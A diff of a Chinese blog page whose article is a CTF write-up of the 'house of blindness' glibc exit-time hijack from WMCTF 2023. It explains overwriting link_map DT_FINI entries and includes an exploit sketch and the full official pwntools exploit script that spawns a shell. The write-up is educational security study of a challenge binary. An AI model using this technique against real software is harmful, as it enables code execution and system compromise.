@@ -1,294 +1,48 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" >
-
-<!--浏览器搞笑标题-->
-<script type="text/javascript" src="/js/FunnyTitle.js"></script>
-
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/duck.png">
-  <link rel="icon" href="/img/icon/duck.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#f58f98">
-  <meta name="author" content="Loora1N">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="在WMCTF 2023官方wp中，看到了一个十分新奇的手法house of blindness. 其无需leak地址却仍然能够hijack程序流，这里做以学习研究">
-<meta property="og:type" content="article">
-<meta property="og:title" content="【trick】house of blindness">
-<meta property="og:url" content="http://loora1n.github.io/2023/09/07/%E3%80%90trick%E3%80%91house%20of%20blindness/index.html">
-<meta property="og:site_name" content="鷺雨のBlog">
-<meta property="og:description" content="在WMCTF 2023官方wp中，看到了一个十分新奇的手法house of blindness. 其无需leak地址却仍然能够hijack程序流，这里做以学习研究">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://loora1n.github.io/img/article/blindness/image-20230907142037610.png">
-<meta property="article:published_time" content="2023-09-07T10:48:56.033Z">
-<meta property="article:modified_time" content="2023-09-07T10:48:56.033Z">
-<meta property="article:author" content="Loora1N">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://loora1n.github.io/img/article/blindness/image-20230907142037610.png">
-  
-  
-  
-  <title>【trick】house of blindness - 鷺雨のBlog</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-
-
-
-  
-<link rel="stylesheet" href="/css/fluid-extention.css">
-<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"loora1n.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"lftEbNU4XPuR5dgHNV3WdWxP-gzGzoHsz","app_key":"b3uLUVGLeOWDwREWHMBr0jo9","server_url":"https://lftebnu4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>鷺雨のBlog | </title>
     
-  
+<link rel="stylesheet" href="/css/reset.css">
 
+    
+<link rel="stylesheet" href="/css/style.css">
 
+    
+<link rel="stylesheet" href="/css/markdown.css">
 
-  
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
 <meta name="generator" content="Hexo 6.2.0"></head>
-
-
-<body>
-  
-
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>鷺雨のBlog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/bg/3.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="【trick】house of blindness"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-07 18:48" pubdate>
-          2023年9月7日 晚上
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          4.3k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          37 分钟
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          阅读量 <span id="leancloud-page-views"></span>
-        </span>
-        
-      
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">【trick】house of blindness</h1>
-            
-            
-              <div class="markdown-body">
+    <body>
+        <div class="paper">
+            <div class="paper-main">
                 
-                <blockquote>
+                    <div class="post-header">
+    <a class="logo" href="/">鷺雨のBlog</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            【trick】house of blindness
+        </div>
+        <div class="post-meta">
+            2023-09-07
+        </div>
+        <div class="post-md">
+            <blockquote>
 <p>在WMCTF 2023官方wp中，看到了一个十分新奇的手法house of blindness. 其无需leak地址却仍然能够hijack程序流，这里做以学习研究。本文例题使用WMCTF2023 blindness</p>
 <p>参考文章: <a target="_blank" rel="noopener" href="https://hackmd.io/jmE0VvcTQaaJm6SEWiqUJA">issues in exit town - HackMD</a></p>
 </blockquote>
@@ -308,11 +62,36 @@
 <p>其中我们需要关注下<code>DT_FINI</code>这个tag，也就是gdb中显示的<code>FINI</code>，其代表了<code>fini</code>函数到程序加载的虚拟地址的offset，即<code>real_fini_addr = code_base + DT_FINI</code>，以本题为例我们可以得到</p>
 <p><img src="/img/article/blindness/image-20230907143044385.png" alt="image-20230907143044385"></p>
 <p>在<code>exit()</code>函数的源码中，我们可以看到如下部分：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Is there a destructor function?  */</span><br><span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span><br>    || l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>)<br>  &#123;<br>    <span class="hljs-comment">/* When debugging print a message first.  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)<br>                          &amp; DL_DEBUG_IMPCALLS, <span class="hljs-number">0</span>))<br>      _dl_debug_printf (<span class="hljs-string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,<br>                        DSO_FILENAME (l-&gt;l_name),<br>                        ns);<br>    <span class="hljs-comment">/* First see whether an array is given.  */</span><br>    <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span>)<br>      &#123;<br>        ElfW(Addr) *<span class="hljs-built_in">array</span> =<br>          (ElfW(Addr) *) (l-&gt;l_addr<br>                          + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val<br>                          / <span class="hljs-keyword">sizeof</span> (ElfW(Addr)));<br>        <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>          ((<span class="hljs-type">fini_t</span>) <span class="hljs-built_in">array</span>[i]) ();<br>      &#125;<br>    <span class="hljs-comment">/* Next try the old-style destructor.  */</span><br>    <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>)<br>      DL_CALL_DT_FINI<br>        (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);<br>  &#125;<br></code></pre></td></tr></table></figure>
-
+<pre><code class="c">/* Is there a destructor function?  */
+if (l-&gt;l_info[DT_FINI_ARRAY] != NULL
+    || l-&gt;l_info[DT_FINI] != NULL)
+  &#123;
+    /* When debugging print a message first.  */
+    if (__builtin_expect (GLRO(dl_debug_mask)
+                          &amp; DL_DEBUG_IMPCALLS, 0))
+      _dl_debug_printf (&quot;\ncalling fini: %s [%lu]\n\n&quot;,
+                        DSO_FILENAME (l-&gt;l_name),
+                        ns);
+    /* First see whether an array is given.  */
+    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)
+      &#123;
+        ElfW(Addr) *array =
+          (ElfW(Addr) *) (l-&gt;l_addr
+                          + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);
+        unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val
+                          / sizeof (ElfW(Addr)));
+        while (i-- &gt; 0)
+          ((fini_t) array[i]) ();
+      &#125;
+    /* Next try the old-style destructor.  */
+    if (l-&gt;l_info[DT_FINI] != NULL)
+      DL_CALL_DT_FINI
+        (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);
+  &#125;
+</code></pre>
 <p>其中最下方的<code>DL_CALL_DT_FINI(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</code>便是调用<code>_fini</code>函数的部分，宏定义如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">define</span> DL_CALL_DT_FINI(map, start) ((fini_t) (start)) ()</span><br></code></pre></td></tr></table></figure>
-
+<pre><code class="c"># define DL_CALL_DT_FINI(map, start) ((fini_t) (start)) ()
+</code></pre>
 <p>而<code>l_addr</code>和<code>l_info[DT_FINI]</code>正对应这我们前面谈到的codebase和.dynamic节上的偏移，l为在ld中存放的link_map结构</p>
 <p>以本题为例，我们用gdb跟踪exit流。可以发现，在调用完<code>__do_global_dtors_aux</code>之后，程序流便会通过r15，来调用<code>fini</code>，如图</p>
 <p><img src="/img/article/blindness/image-20230907154901922.png" alt="image-20230907154901922"></p>
@@ -327,16 +106,32 @@
 <p><img src="/img/article/blindness/image-20230907160909407.png" alt="image-20230907160909407"></p>
 <p>此时rdi参数恰好也是ld中的一个指针，另外还需要劫持<code>fini_array</code>为空，防止由于指针更改出现crash</p>
 <p>原作者给出了exp的大致形式如下:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># disable fini array from exec</span><br>write(ld.address + link_map + l_info + <span class="hljs-number">8</span> * DT_FINI_ARRAY, p64(<span class="hljs-number">0</span>))<br><br><span class="hljs-comment"># overwrite l_info[DT_FINI]&#x27;s lsb so that it points to _r_debug</span><br>write(ld.address + link_map + l_info + <span class="hljs-number">8</span> * DT_FINI, <span class="hljs-string">b&quot;\xb8&quot;</span>)<br><br><span class="hljs-comment"># overwrite l_addr with offset to bring _r_debug to system</span><br>write(<br>    ld.address + link_map,<br>    p64(libc.symbols[<span class="hljs-string">&quot;system&quot;</span>] - ld.symbols[<span class="hljs-string">&quot;_r_debug&quot;</span>], signed=<span class="hljs-literal">True</span>),<br>)<br><br><span class="hljs-comment"># fill _dl_load_lock with /bin/sh</span><br>write(ld.symbols[<span class="hljs-string">&quot;_rtld_global&quot;</span>] + _dl_load_lock, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br></code></pre></td></tr></table></figure>
+<pre><code class="python"># disable fini array from exec
+write(ld.address + link_map + l_info + 8 * DT_FINI_ARRAY, p64(0))
 
+# overwrite l_info[DT_FINI]&#39;s lsb so that it points to _r_debug
+write(ld.address + link_map + l_info + 8 * DT_FINI, b&quot;\xb8&quot;)
+
+# overwrite l_addr with offset to bring _r_debug to system
+write(
+    ld.address + link_map,
+    p64(libc.symbols[&quot;system&quot;] - ld.symbols[&quot;_r_debug&quot;], signed=True),
+)
+
+# fill _dl_load_lock with /bin/sh
+write(ld.symbols[&quot;_rtld_global&quot;] + _dl_load_lock, b&quot;/bin/sh\x00&quot;)
+</code></pre>
 <p>总结一下利用条件：</p>
 <ul>
 <li>malloc的size不限制大小，比如可以<code>malloc(0x100000)</code></li>
 <li>可以在malloc出的chunk附近实现越界的任意写</li>
 </ul>
 <p>作者给出的利用条件的形式如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// get size from user</span><br><span class="hljs-type">char</span> *chunk = <span class="hljs-built_in">malloc</span>(size);<br><span class="hljs-comment">// get idx and byte from the user</span><br>chunk[idx] = byte;<br></code></pre></td></tr></table></figure>
-
+<pre><code class="c">// get size from user
+char *chunk = malloc(size);
+// get idx and byte from the user
+chunk[idx] = byte;
+</code></pre>
 <h2 id="WMCTF-blindness"><a href="#WMCTF-blindness" class="headerlink" title="WMCTF blindness"></a>WMCTF blindness</h2><p>WMCTF的这道例题也使用了类似的思想，不过手法并不完全相同，并非利用<code>DT_DEBUG</code>. 我们可以再看一眼本题的.dynamic标签的地址分布</p>
 <p><img src="/img/article/blindness/image-20230907142646702.png" alt="image-20230907142646702"></p>
 <p>可以注意到<code>DT_FINI</code>的地址为0x3DB8，<code>DT_DEBUG</code>的地址为0x3E58，即如果我们考虑原作者的思路。则需要覆盖2个byte，即仍需1&#x2F;16的爆破。但是我们注意到，本题是存在后门<code>backdoor</code>的，那么我们可以控制<code>l_info[DT_FINI]</code>为一个text段的函数，然后利用l_addr偏移至后门即可。可以看到.dynamic上面的一个标签<code>__frame_dummy_init_array_entry</code></p>
@@ -344,436 +139,72 @@
 <p>且恰好后门函数和该函数只有0x9的偏移，如图。那么我们就可以覆盖l_info[DT_FINI]的最低字节从0xB8到0x80，然后控制l_addr偏移为9，从而执行后门函数.</p>
 <p><img src="/img/article/blindness/image-20230907173108919.png" alt="image-20230907173108919"></p>
 <p>官方exp如下，估计出题人套了自己的板子，因而注释与代码并不匹配，这里并非利用DT_DEBUG。且劫持参数为<code>/bin/sh</code>也是无必要的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">addr,content</span>):<br>    content = <span class="hljs-built_in">list</span>(content)<br>    payload = <span class="hljs-string">&quot;@&quot;</span> + p32(addr)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(content)):<br>        payload += <span class="hljs-string">&#x27;.&#x27;</span> + p8(<span class="hljs-built_in">ord</span>(content[i]))<br>        payload += <span class="hljs-string">&#x27;&gt;&#x27;</span><br>    <span class="hljs-keyword">return</span> payload<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p.recv()<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x100000</span>))<br>    p.recv()<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x100</span>))<br>    p.recv()<br>    payload = write(<span class="hljs-number">0x33f958</span> - <span class="hljs-number">0x1c000</span>,<span class="hljs-string">&quot;/bin/sh;&quot;</span>) <span class="hljs-comment">#劫持参数</span><br>    payload += write(<span class="hljs-number">0x340180</span>-<span class="hljs-number">0x33f958</span>-<span class="hljs-number">0x8</span>,p64(<span class="hljs-number">0x9</span>)) <span class="hljs-comment">#将l_addr改为DT_DEBUg和system函数的差值</span><br>    payload += write(<span class="hljs-number">0x340228</span>-<span class="hljs-number">0x340180</span>-<span class="hljs-number">0x8</span>,p8(<span class="hljs-number">0x88</span>-<span class="hljs-number">0x8</span>)) <span class="hljs-comment">#劫持DT_FINI指向DT_DEBUG</span><br>    payload += write(<span class="hljs-number">0x340290</span>-<span class="hljs-number">0x340228</span> - <span class="hljs-number">0x1</span>,p64(<span class="hljs-number">0</span>)) <span class="hljs-comment">#使得DT_FINI_ARRAY为NULL</span><br>    payload += <span class="hljs-string">&#x27;q&#x27;</span><br>    p.send(payload)<br>    p.interactive()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    binary = <span class="hljs-string">&#x27;./main&#x27;</span><br>    elf = ELF(<span class="hljs-string">&#x27;./main&#x27;</span>)<br>    context.binary = binary<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">3</span>):<br>        p = remote(sys.argv[<span class="hljs-number">1</span>],sys.argv[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">else</span>:<br>        p = process(binary)<br>    exp()<br></code></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+import sys
+import os
+from pwn import *
+from ctypes import *
+#context.log_level = &#39;debug&#39;
+def write(addr,content):
+    content = list(content)
+    payload = &quot;@&quot; + p32(addr)
+    for i in range(len(content)):
+        payload += &#39;.&#39; + p8(ord(content[i]))
+        payload += &#39;&gt;&#39;
+    return payload
+def exp():
+    p.recv()
+    p.send(str(0x100000))
+    p.recv()
+    p.send(str(0x100))
+    p.recv()
+    payload = write(0x33f958 - 0x1c000,&quot;/bin/sh;&quot;) #劫持参数
+    payload += write(0x340180-0x33f958-0x8,p64(0x9)) #将l_addr改为DT_DEBUg和system函数的差值
+    payload += write(0x340228-0x340180-0x8,p8(0x88-0x8)) #劫持DT_FINI指向DT_DEBUG
+    payload += write(0x340290-0x340228 - 0x1,p64(0)) #使得DT_FINI_ARRAY为NULL
+    payload += &#39;q&#39;
+    p.send(payload)
+    p.interactive()
+if __name__ == &quot;__main__&quot;:
+    binary = &#39;./main&#39;
+    elf = ELF(&#39;./main&#39;)
+    context.binary = binary
+    if(len(sys.argv) == 3):
+        p = remote(sys.argv[1],sys.argv[2])
+    else:
+        p = process(binary)
+    exp()
+</code></pre>
 
+        </div>
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 鷺雨のBlog</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
 </div>
 
 
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>【trick】house of blindness</div>
-      <div>http://loora1n.github.io/2023/09/07/【trick】house of blindness/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>Loora1N</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2023年9月7日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
 
 
+<script src="/js/highlight.min.js"></script>
 
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2023/09/11/%E3%80%90Kernel%E3%80%91Linux%20Huge%20Pages/" title="【Kernel】Linux Huge Pages">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">【Kernel】Linux Huge Pages</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2023/09/04/%E3%80%90fuzz%E3%80%91AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%20part%202/" title="【fuzz】AFL源码分析 part 2">
-                        <span class="hidden-mobile">【fuzz】AFL源码分析 part 2</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
             </div>
-
-            
-  <article id="comments">
-    
-  <script type="text/javascript">
-    Fluid.utils.loadComments('#comments', function() {
-      var light = 'github-light';
-      var dark = 'github-dark';
-      var schema = document.documentElement.getAttribute('data-user-color-scheme');
-      if (schema === 'dark') {
-        schema = dark;
-      } else {
-        schema = light;
-      }
-      window.UtterancesThemeLight = light;
-      window.UtterancesThemeDark = dark;
-      var s = document.createElement('script');
-      s.setAttribute('src', 'https://utteranc.es/client.js');
-      s.setAttribute('repo', 'loora1n/comment');
-      s.setAttribute('issue-term', 'pathname');
-      
-      s.setAttribute('label', 'utterances');
-      
-      s.setAttribute('theme', schema);
-      s.setAttribute('crossorigin', 'anonymous');
-      document.getElementById('comments').appendChild(s);
-    })
-  </script>
-  <noscript>Please enable JavaScript to view the comments</noscript>
-
-
-  </article>
-
-
-          </article>
         </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://github.com/Loora1N" target="_blank" rel="nofollow noopener"><span>Loora1N</span></a> <i class="iconfont icon-love"></i> <a href="https://space.bilibili.com/33242548?spm_id_from=333.1007.0.0" target="_blank" rel="nofollow noopener"><span>鷺雨君</span></a>
-    </div>
-  
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
-</div>
-
-  
-  
-  
-  <span id="timeDate">载入天数...</span>
-  <span id="times">载入时分秒...</span>
-  <script>
-  var now = new Date();
-  function createtime(){
-      var grt= new Date("06/03/2022 00:00:00");//此处修改你的建站时间或者网站上线时间
-      now.setTime(now.getTime()+250);
-      days = (now - grt ) / 1000 / 60 / 60 / 24;
-      dnum = Math.floor(days);
-      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
-      hnum = Math.floor(hours);
-      if(String(hnum).length ==1 ){
-          hnum = "0" + hnum;
-      }
-      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
-      mnum = Math.floor(minutes);
